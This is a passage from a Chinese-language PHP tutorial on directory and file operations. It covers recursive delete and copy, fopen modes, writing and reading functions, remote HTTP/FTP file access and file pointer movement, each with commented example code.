$dir_size+=filesize($subFile);  //求出文件的大小并累加</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			closedir($dir_handle);                    //关闭文件资源</span><br><span class="line">			return $dir_size;                         //返回计算后的目录大小</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$dir_size=dirSize(&quot;phpMyAdmin&quot;);         	//调用该函数计算目录大小，返回目录大小的字节数</span><br><span class="line">	echo round($dir_size/pow(1024,1),2).&quot;KB&quot;;   	//将获取的目录字节数转换为“KB”单位并输出</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="建立和删除目录">建立和删除目录</span></h3><p>在PHP中，使用mkdir()函数只需要传入一个目录名即可很容易地建立一个新目录。但删除目录所用的函数rmdir()，只能删除一个空目录并且目录必须存在。如果是非空的目录就需要先进入到路中，使用unlink()函数将目录中的每个文件都删除掉，再回来将这个空目录删除。如果目录中还存在子目录，而且子目录也非空，就要使用递归的方法了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function delDir($directory) &#123;         		//自定义函数递归的删除整个目录</span><br><span class="line">		if(file_exists($directory)) &#123;      	//判断目录是否存在，如果不存在rmdir()函数会出错</span><br><span class="line">			if($dir_handle=@opendir($directory)) &#123;      	//打开目录返回目录资源，并判断是否成功</span><br><span class="line">				while($filename=readdir($dir_handle)) &#123;  //遍历目录，读出目录中的文件或文件夹</span><br><span class="line">					if($filename!=&quot;.&quot; &amp;&amp; $filename!=&quot;..&quot;) &#123;   	//一定要排除两个特殊的目录</span><br><span class="line">						$subFile=$directory.&quot;/&quot;.$filename;   	//将目录下的文件和当前目录相连</span><br><span class="line">						if(is_dir($subFile))                	//如果是目录条件则成立</span><br><span class="line">							delDir($subFile);             	//递归调用自己删除子目录</span><br><span class="line">						if(is_file($subFile))                	//如果是文件条件则成立</span><br><span class="line">							unlink($subFile);             	//直接删除这个文件</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				closedir($dir_handle);                       	//关闭目录资源</span><br><span class="line">				rmdir($directory);                          	//删除空目录</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	delDir(&quot;phpMyAdmin&quot;);  //调用delDir()函数，将程序所在目录中的“phpMyAdmin”文件夹删除</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="复制或移动目录">复制或移动目录</span></h3><p>要赋值一个包含多级子目录的目录，将涉及文件的赋值、目录创建等操作。赋值一个文件可以通过PHP提供的copy()函数完成，创建目录可以使用mkdir()函数，定义函数时，首先对原木了进行遍历，如果遇到的是普通文件，直接使用copy()函数进行复制。如果遍历时遇到一个目录，则必须建立该目录，然后再对该目录下的文件进行复制操作，如果还有子目录，则使用递归重复操作，最终将整个目录复制完成。如果是移动目录，只需在遍历时将赋值后的文件或目录删除即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function copyDir($dirSrc, $dirTo) &#123;       //自定义函数递归的复制带有多级子目录的目录</span><br><span class="line">		if(is_file($dirTo)) &#123;               //如果目标不是一个目录，是一个已存在的文件则退出</span><br><span class="line">			echo &quot;目标不是目录不能创建!!&quot;;</span><br><span class="line">			return;                    //退出函数</span><br><span class="line">		&#125;</span><br><span class="line">		if(!file_exists($dirTo)) &#123;          //如果目标目录不存在则创建，存在则不变</span><br><span class="line">			mkdir($dirTo);             //创建目录目录</span><br><span class="line">		&#125;</span><br><span class="line">		if($dir_handle=@opendir($dirSrc)) &#123;           //打开目录返回目录资源，并判断是否成功</span><br><span class="line">			while($filename=readdir($dir_handle)) &#123;    //遍历目录，读出目录中的文件或文件夹</span><br><span class="line">				if($filename!=&quot;.&quot; &amp;&amp; $filename!=&quot;..&quot;) &#123;     //一定要排除两个特殊的目录</span><br><span class="line">					$subSrcFile=$dirSrc.&quot;/&quot;.$filename;     //将源目录的多级子目录连接</span><br><span class="line">					$subToFile=$dirTo.&quot;/&quot;.$filename;      //将目标目录的多级子目录连接</span><br><span class="line">						</span><br><span class="line">					if(is_dir($subSrcFile))                    //如果源文件是一个目录</span><br><span class="line">						copyDir($subSrcFile, $subToFile);     //递归调用自己复制子目录</span><br><span class="line">					if(is_file($subSrcFile))                   //如果源文件是一个普通文件</span><br><span class="line">						copy($subSrcFile, $subToFile);       //直接复制到目标位置</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			closedir($dir_handle);       //关闭目录资源</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	copyDir(&quot;phpMyAdmin&quot;, &quot;D:/admin&quot;);   //测试函数，将目录&quot;phpMyAdmin&quot;复制到&quot;D:/admin&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h2><span id="文件的基本操作">文件的基本操作</span></h2><h3><span id="文件的打开与关闭">文件的打开与关闭</span></h3><p>在PHP中可以通过标准函数fopen()建立与文件资源的连接，使用fclose()函数关闭通过fopen()函数打开的文件资源。</p>
<h4><span id="函数fopen">函数fopen()</span></h4><p>该函数用来打开一个文件，并在打开一个文件时，还需要指定如何使用它。也就是以哪种文件模式打开文件资源。服务器上的操作系统文件必须知道对打开文件进行什么操作。操作系统需要了解在打开这个文件之后，这个文件是否允许其他的程序脚本再打开，还需要了解脚本的属主用户是否具有在这种方式下使用该文件的权限。该函数的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource fopen(string filename,string mode[,bool use_include_path[,resource zcontext]])  //打开文件</span><br></pre></td></tr></table></figure></p>
<p>第一个参数需要提供要被打开文件的URL。这个URL可以是脚本所在的服务器中的绝对路径，也可以是相对路径，还可以是网络资源中的文件。<br>第二个参数需要提供文件模式，文件模式可以告诉操作系统如何处理来自其他人或脚本的访问请求，以及一种用来检查你是否有权访问这个特定文件的方法。当在打开文件时有三种选择：</p>
<ul>
<li>打开一个文件为了只读、只写或者是读和写。</li>
<li>如果要写一个文件，可以覆盖所有已有的文件内容，或者需要将新数据追加到文件末尾。</li>
<li>如果在一个区分二进制文件和纯文本文件的系统上写一个文件，还必须指定采用的方式。<br>函数fopen()也支持以上三种方式的组合，只需要在第二个参数中提供一个字符串，指定将对文件进行的操作即可。</li>
</ul>
<table>
<thead>
<tr>
<th>模式字符</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td style="text-align:left">只读方式打开文件，从文件开头开始读</td>
</tr>
<tr>
<td>r+</td>
<td style="text-align:left">读写方式打开文件，从文件开头开始读写</td>
</tr>
<tr>
<td>w</td>
<td style="text-align:left">只写方式打开文件，从文件开头开始写。如果文件已经存在，将文件指针指向文件头并将文件大小截为零，即删除所有文件已有的内容。如果该文件不存在，函数将创建这个文件</td>
</tr>
<tr>
<td>w+</td>
<td style="text-align:left">读写方式打开文件，从文件开头开始读写。如果文件已经存在，将文件指针指向文件头并将文件大小截为零，即删除所有文件已有的内容。如果文件不存在，函数将创建这个文件</td>
</tr>
<tr>
<td>x</td>
<td style="text-align:left">创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则fopen()调用失败并返回FALSE，并生成一条E_WARNING级别的错误信息。如果文件不存在则尝试创建之。仅能用于本地文件</td>
</tr>
<tr>
<td>x+</td>
<td style="text-align:left">创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则fopen()调用失败并返回FALSE，并生成一条E_WARNING级别的错误信息。如果文件不存在则尝试创建之。仅能用于本地文件</td>
</tr>
<tr>
<td>a</td>
<td style="text-align:left">写入方式打开，将文件指针指向文件末尾。如果该文件已有内容，将从该文件末尾开始追加。如果该文件不存在，函数将创建这个文件。</td>
</tr>
<tr>
<td>a+</td>
<td style="text-align:left">写入方式打开，将文件指针指向文件末尾。如果该文件已有内容，将从该文件末尾开始追加或读。如果该文件不存在，函数将创建这个文件。</td>
</tr>
<tr>
<td>b</td>
<td style="text-align:left">以二进制模式打开文件，用于与其他模式进行连接。如果文件系统能够区分二进制文件和文本文件，你可能会使用它。例如在Windows系统中可以区分，而UNIX系统则不区分。这个模式是默认的模式</td>
</tr>
<tr>
<td>t</td>
<td style="text-align:left">以文本模式打开文件，这个模式也只是windows系统下一个选项，不推荐使用</td>
</tr>
</tbody>
</table>
<p>第三个参数是可选的，如果资源位于本地文件系统，PHP则认为可以使用本地路径或相对路径来访问资源。如果这个参数设置为1，这样就会使PHP考虑配置指令include_path中指定的路径。<br>第四个参数也是可选的，fopen()函数允许文件名称以协议名称开始，例如“<a href="http://”，并且在一个远程位置打开该文件。通过设置这个参数，还可以支持一些其他的协议。" target="_blank" rel="noopener">http://”，并且在一个远程位置打开该文件。通过设置这个参数，还可以支持一些其他的协议。</a><br>如果fopen()函数成功打开一个文件，该函数将返回一个指向这个文件的文件指针。对该文件进行操作所使用的读、写以及其他的文件操作函数，都要使用这个资源来访问该文件。如果打开文件失败，则返回FALSE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//使用绝对路径打开file.txt文件，选择只读模式，并返回资源$handle</span><br><span class="line">	$handle = fopen(&quot;/home/rasmus/file.txt&quot;,&quot;r&quot;);</span><br><span class="line">	//访问文档根目录下的文件，也以只读模式打开</span><br><span class="line">	$handle = fopen(&quot;$_SERVER[&apos;DOCUMENT_ROOT&apos;]/data/info.txt&quot;,&quot;r&quot;);</span><br><span class="line">	//在Windows平台上，转义文件路径中的每个反斜线，或者用斜线，以二进制和只写模式组合</span><br><span class="line">	$handle = fopen(&quot;c:\\data\\file.gif&quot;,&quot;wb&quot;);</span><br><span class="line">	//使用相对路径打开file.txt文件，选择只读模式，并返回资源$handle</span><br><span class="line">	$handle = fopen(&quot;../data/info.txt&quot;,&quot;r&quot;);</span><br><span class="line">	//打开远程文件，使用HTTP协议只能以只读的模式打开</span><br><span class="line">	$handle = fopen(&quot;http://www.example.com/&quot;,&quot;r&quot;);</span><br><span class="line">	//使用HTTP协议打开远程文件，如果FTP服务器可写，则可以以写的模式打开</span><br><span class="line">	$handle = fopen(&quot;ftp://user:password@example.com/somefile.txt&quot;,&quot;w&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数fclose">函数fclose()</span></h4><p>函数fclose()就会撤销fopen()打开的资源类型，成功时返回TRUE，否则返回FALSE。参数必须使用fopen()或fsockopen()函数打开的已存的文件指针。在目录操作中opendir()函数也是开启一个资源，使用closedir()将其关闭。</p>
<h3><span id="写入文件">写入文件</span></h3><p>将程序中的数据保存到文件中比较容易，使用fwrite()函数就可以将字符串内容写入文件中。在文件中通过字符序列\n表示换行符，标识文件中一行的末尾。当需要一次输入或输出一行信息时，不同的操作系统具有不同的结束符号，基于UNIX的系统使用“\n”作为行结束字符，基于Windows的系统使用“\n\r”作为行结束字符，基于Macintosh的系统使用“\r”作为行结束字符。当要写入一个文本文件并想插入一个新行时，需要使用相应操作系统的行结束符号。函数fwrite()的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fwrite(resource handle,string string [,int length])			//写入文件</span><br></pre></td></tr></table></figure></p>
<p>第一个参数需要提供fopen()函数打开的文件资源，该函数将第二个参数提供的字符串内容输出到由第一个参数指定的资源中。如果给出了第三个可选参数length，fwrite()将在写入了length个字符时停止。否则将一直写入，直到到达内容结束时才停止。如果写入的内容少于length个字节，该函数也会在写完全部内容后停止。函数fwrite()执行完成以后会返回写入的字符数，出现错误时则返回FALSE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$fileName=&quot;data.txt&quot;;     //声明一个变量用来保存文件名		</span><br><span class="line">     	//使用fopen()函数以只写的模式打开文件，如果不存在则创建它，打开失败则通过程序</span><br><span class="line">	$handle = fopen($fileName, &apos;w&apos;) or die(&apos;打开&lt;b&gt;&apos;.$fileName.&apos;&lt;/b&gt;文件失败!!&apos;);</span><br><span class="line">	</span><br><span class="line">	for($row=0; $row&lt;10; $row++)                      //循环10次写入10行数据到文件中</span><br><span class="line">		fwrite($handle, $row.&quot;: www.lampbrother.net\n&quot;);	 //写入文件 </span><br><span class="line">		</span><br><span class="line">	fclose($handle);	         //关闭由fopen()打开的文件指针资源</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>另外，写入文件还可以使用fputs()函数，该函数是fwrite()函数的别名函数。如果需要快速写入文件还可以使用file_put_contents()函数，和依次调用fopen(),fwrite()以及fclose()函数的功能一样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$fileName=&quot;data.txt&quot;;             //声明一个变量用来保存文件名</span><br><span class="line">	$data=&quot;共10行数据\n&quot;;           //声明一个变量用来保存被写入文件中的数据</span><br><span class="line"></span><br><span class="line">	for($row=0; $row&lt;10; $row++)     //使用循环形成10行数据</span><br><span class="line">		$data.=$row.&quot;: www.lampbrother.net\n&quot;;    //将10数据都存放到一个字符串变量中</span><br><span class="line">		</span><br><span class="line">	file_put_contents($fileName, $data);		    //一次将所有数据写入到指定的文件中</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>该函数可以将数据直接写入到指定的文件中。如果同时调用多次时，并向同一个文件中写入数据，则文件中只保存了最后一次调用该函数写入的数据。因为在每次调用时都会重新打开文件并将文件中原有的数据清空，所以不能连续写入多行数据。</p>
<h3><span id="读取文件内容">读取文件内容</span></h3><table>
<thead>
<tr>
<th>函数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>fread()</td>
<td style="text-align:left">读取打开的文件</td>
</tr>
<tr>
<td>file_get_contents()</td>
<td style="text-align:left">将文件读入字符串</td>
</tr>
<tr>
<td>fgets()</td>
<td style="text-align:left">从打开的文件中返回一行</td>
</tr>
<tr>
<td>fgetc()</td>
<td style="text-align:left">从打开的文件中返回字符</td>
</tr>
<tr>
<td>file()</td>
<td style="text-align:left">把文件读入一个数组中</td>
</tr>
<tr>
<td>readfile()</td>
<td style="text-align:left">读取一个文件，并输出到输出缓冲</td>
</tr>
</tbody>
</table>
<h4><span id="函数fread">函数fread()</span></h4><p>该函数用来在打开的文件中读取指定长度的字符串。也可以安全用于二进制文件，在区分二进制文件和文本文件的系统（如Windows）打开文件时，fopen()函数的mode参数要加上’b’。函数fwrite()的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string fread(int handle,int length)		//读取打开的文件</span><br></pre></td></tr></table></figure></p>
<p>该函数从文件指针资源handle中读取最多length个字节。在读取完length个字节数，或到达EOF的时候，或当一个包可用都会停止读取文件，就看先碰到哪种情况了。该函数返回读取的内容字符串，如果失败则返回FALSE。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">     	//从文件中读取指定字节数的内容存入到一个变量中</span><br><span class="line">	$filename = &quot;data.txt&quot;;                               //将本地文件名保存在变量中</span><br><span class="line">	$handle = fopen($filename, &quot;r&quot;) or die(&quot;文件打开失败&quot;);   //以只读的方式打开文件，返回文件资源</span><br><span class="line">	$contents = fread($handle, 100);                       //从文件中读取前100个字节</span><br><span class="line">	fclose($handle);                                    //关闭文件资源</span><br><span class="line">	echo $contents;                                    //将从文件中读取的内容输出</span><br><span class="line">	</span><br><span class="line">     	//从文件中读取全部内容存入到一个变量中，每次读取一部分，循环读取</span><br><span class="line">	$filename=&quot;c:\\files\\somepic.gif&quot;;                      //将二进制文件的文件名保存在变量中</span><br><span class="line">	$handle = fopen ($filename, &quot;rb&quot;) or die(&quot;文件打开失败&quot;);  //以只读的方式打开文件，模式加了’b’</span><br><span class="line">	$contents = &quot;&quot;;                             //声明一个用于保存全部文件内容的字符串</span><br><span class="line">	while (!feof($handle)) &#123;                      //循环读取文件中内容，使用feof()判断文件结尾</span><br><span class="line"> 		 $contents .= fread($handle, 1024);        //每次读取1024个字节</span><br><span class="line">	&#125;</span><br><span class="line">	fclose($handle);                            //关闭文件资源</span><br><span class="line">	echo $contents;                            //将从文件中读取的全部内容输出</span><br><span class="line"></span><br><span class="line">     	//另一种从文件中读取全部内容的方法</span><br><span class="line">	$filename = &quot;data.txt&quot;;                              //将本地文件名保存在变量中</span><br><span class="line">	$handle = fopen($filename, &quot;r&quot;) or die(&quot;文件打开失败&quot;);  //以只读的方式打开文件，返回文件资源</span><br><span class="line">	$contents = fread($handle, filesize ($filename));     //使用filesize()函数获取文件长度，一起读出</span><br><span class="line">	fclose($handle);                               //关闭文件资源</span><br><span class="line">	echo $contents;                               //将从文件中读取的全部内容输出</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>如果你只是想将一个文件的内容读入到一个字符串中，可以用file_get_contents()函数，它的性能比上面的代码好得多。file_get_contents()函数用来将文件的内容读入到一个字符串中的首选方法，如果操作系统支持还会使用内存映射技术来增强性能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo file_get_contents(&quot;data.txt&quot;);			//读取文本文件中的内容并输出</span><br><span class="line">	echo file_get_contents(&quot;c:\\files\\somepic.gif&quot;);				//读取二进制文件中的内容并输出</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数fgets-fgetc">函数fgets()、fgetc()</span></h4><p>该函数一次至多从打开的文件资源中读取一行内容。函数fgets()的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string fgets(int handle[,int length)			//从打开的文件中返回一行</span><br></pre></td></tr></table></figure></p>
<p>第一个参数提供使用fopen()函数打开的资源。如果提供了第二个可选参数length，该函数返回length-1个字节。或者返回遇到换行或EOF之前读取的所以内容。如果忽略可选的length参数，默认为1024个字符前遇到换行符号，因此每次成功调用都会返回下一行。如果读取失败则返回FALSE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$handle = fopen(&quot;data.txt&quot;, &quot;r&quot;)  or die(&quot;文件打开失败&quot;);    //以只读模式打开文件</span><br><span class="line">	while (!feof($handle)) &#123;                   	//循环读取第一行，使用feof判断读取文件结尾</span><br><span class="line">  		$buffer = fgets($handle, 4096);         //一次读取打开文件中的一行内容</span><br><span class="line">   		echo $buffer.&quot;&lt;br&gt;&quot;;                 	//输出每一行，并加上HTML的换行标记</span><br><span class="line">	&#125;</span><br><span class="line">	fclose($handle);                         	//关闭打开的文件资源</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>函数fgetc()在打开的文件资源中只读取当前指针位置处的一个节符。如果遇到文件结束标志EOF时，将返回FALSE值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$fp = fopen(&apos;data.txt&apos;, &apos;r&apos;) or die(&quot;文件打开失败&quot;);    //以只读模式打开文件</span><br><span class="line">	</span><br><span class="line">	while (false !== ($char = fgetc($fp))) &#123;      //循环文件中读取一个节符碰到 EOF 标记停止</span><br><span class="line">   		 echo $char.&quot;&lt;br&gt;&quot;;                 //输出单个字符</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数file">函数file()</span></h4><p>该函数非常有用，与file_get_contents()类似，不需要使用fopen()函数打开文件，不同的是file()函数可以把整个文件读入到一个数组中。数组中的每个元素对应文件中的行，各元素由换行符分隔，同时换行符仍附加在每个元素的末尾。这样，就可以使用数组的相关函数对文件内容进行处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	print_r(file(&quot;test.txt&quot;);			//将文件test.txt中的内容读入到一个数组中，并输出。</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数readfile">函数readfile()</span></h4><p>该函数可以读取指定的整个文件，立即输出到输出缓冲区，并返回读取的字节数。该函数也不需要使用fopen()函数打开文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	readfile(&quot;data.txt&quot;);			//直接将文件data.txt中的数据独处并输出到浏览器</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="访问远程文件">访问远程文件</span></h3><p>使用PHP不仅可以让用户通过浏览器访问服务器端的文件，还可以通过HTTP或FTP等协议访问其他服务器中的文件，可以在大多数需要文件名作为参数的函数中使用HTTP和FTP URL来代替文件名。使用fopen()函数将指定的文件名与资源绑定到一个流上，如果文件名是“scheme://..”的格式，则被当成一个URL，PHP将搜索协议处理器来处理此模式。<br>如果需要访问远程文件，必须在PHP的配置文件中激活“allow_url_fopen”选项，才能使用fopen()函数打开远程文件。而且还要确定其他服务器中的文件是否有访问权限，如果使用HTTP协议对远程文件进行连接，只能以“只读”模式打开。如果需要访问的远程FTP服务器中，对所提供的用户开启了“可写”权限，则使用FTP协议连接远程的文件时，就可以使用“可写”或“可读”模式打开文件。但不可以使用“可读可写”的模式。<br>使用PHP访问远程文件就向访问本地文件一样，都是使用相同的读写函数处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file = fopen (&quot;http://www.lampbrother.com/&quot;, &quot;r&quot;) or die(&quot;打开远程文件失败！！&quot;);  //打开远程文件</span><br><span class="line"></span><br><span class="line">	while (!feof ($file)) &#123;              //循环从文件中读取内容</span><br><span class="line">    		$line = fgets ($file, 1024);     //每读取一行</span><br><span class="line">         //如果找到远程文件中的标题标记则取出标题，并退出循环，不在读取文件</span><br><span class="line">   		if (preg_match(&quot;/&lt;title&gt;(.*)&lt;\/title&gt;/&quot;, $line, $out)) &#123;    //使用正则匹配标题标记</span><br><span class="line">     			$title = $out[1];                        //将标题标记中的标题字符取出</span><br><span class="line">      			break;                                //退出循环，结束远程文件读取</span><br><span class="line">   		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose($file);                  //关闭文件资源</span><br><span class="line">	echo $title;                   //输出获取到的远程网页的标题</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//在ftp.lampbrother.net的远程服务器上创建文件，以写的模式打开</span><br><span class="line">	$file = fopen(&quot;ftp://user:password@ftp.lampbrother.net/path/to/file&quot;,&quot;w&quot;);</span><br><span class="line">	fwrite($file,&quot;Linux+Apache+MySQL+PHP&quot;);   	//将一个字符串写入到远程文件中去</span><br><span class="line">	fclose($file);				//关闭文件资源</span><br></pre></td></tr></table></figure>
<h3><span id="移动文件指针">移动文件指针</span></h3><p>在对文件进行读写过程中，有时需要在文件中跳转、从不同位置读取，以及将数据写入到不同的位置。指针的位置是以从文件头开始的字节数度量的，默认以不同模式打开文件时，文件指针通常在文件的开头或者结尾处，可以通过ftell()、fseek()和rewind()三个函数对文件指针进行操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int ftell(resource handle)				//返回文件指针的当前位置</span><br><span class="line">int fseek(resource handle,int offset[,int whence])			//移动文件指针到指定位置</span><br><span class="line">bool rewind(resource handle)			//移动文件指针到文件的开头</span><br></pre></td></tr></table></figure></p>
<p>使用这些函数时，必须提供一个用fopen()函数打开的、合法的文件指针。函数ftell()获取由指定的资源中的文件指针当前位置的偏移量;函数rewind()将文件指针移回到指定资源的开头；而函数fseek()则将指针移动到第二个参数offset指定的位置，如果没有提供第三个可选参数whence，则位置将设置为从文件开头的offset字节处。否则，第三个参数whence可以设置为三个可能的值，它将影响指针的位置。</p>
<ul>
<li>SEEK_CUR:设置指针位置为当前位置加上第二个参数所提供的offset字节</li>
<li>SEEK_END：设置指针位置为EOF加上offset字节。在这里，offset必须设置为负值</li>
<li>SEEK_SET:设置指针位置为offset字节处。这与忽略第三个参数whence效果相同。<br>如果fseek()函数执行成功，将返回0，失败则返回-1.如果将文件以追加模式“a”或者“a+”打开，写入文件的任何数据总是会被附加在后面，不会管文件指针的位置。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$fp = fopen(&apos;data.txt&apos;, &apos;r&apos;) or die(&quot;文件打开失败&quot;);    //以只读模式打开文件</span><br><span class="line">	</span><br><span class="line">	echo ftell($fp).&quot;&lt;br&gt;&quot;;         //输出刚打开文件的指针默认位置，指针在文件的开头位置为0</span><br><span class="line">	echo fread($fp, 10).&quot;&lt;br&gt;&quot;;     //读取文件中的前10个字符输出，指针位置发生了变化</span><br><span class="line">	echo ftell($fp).&quot;&lt;br&gt;&quot;;         //读取文件的前10个字符之后，指针移动的位置在第10个字节处</span><br><span class="line">	fseek($fp, 100, SEEK_CUR);   	//将文件指针的位置，由当前位置向后移动100个字节数</span><br><span class="line">	echo ftell($fp).&quot;&lt;br&gt;&quot;;         //文件位置在110个字节处</span><br><span class="line">	echo fread($fp, 10).&quot;&lt;br&gt;&quot;;     //读取110到120字节数位置的字符串，读取后指针的位置为120</span><br><span class="line">	fseek($fp, -10, SEEK_END);   	//又将指针移动到倒数10个字节位置处</span><br><span class="line">	echo fread($fp, 10).&quot;&lt;br&gt;&quot;;     //输出文件中最后10个字符	</span><br><span class="line">	rewind($fp);                 	//又移动文件指针到文件的开头</span><br><span class="line">	echo ftell($fp).&quot;&lt;br&gt;&quot;;         //指针在文件的开头位置，输出0</span><br><span class="line"></span><br><span class="line">	